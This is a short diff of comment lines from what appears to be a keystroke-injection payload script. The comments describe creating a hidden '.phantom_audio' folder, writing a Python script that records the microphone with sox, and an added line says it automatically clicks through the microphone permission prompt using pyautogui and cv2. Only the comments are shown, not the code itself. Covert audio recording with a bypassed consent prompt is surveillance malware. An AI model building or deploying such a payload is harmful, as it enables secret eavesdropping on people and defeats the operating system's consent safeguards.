@@ -1,6 +1,7 @@
- REM Creates a hidden folder named .phantom_audio in the home directory.
+REM Creates a hidden folder named .phantom_audio in the home directory.
 REM Writes a Python script (record.py) that uses the sox utility 
 REM to record audio from the microphone and save it as a .mp3 file. 
+REM Will automatically allow the mic permission with pyautogui and cv2 
 
 REM Once executed, the audio recording will start and continue until manually stopped
 REM You can stop the audio recording by finding the PID and using 'kill pid#'  
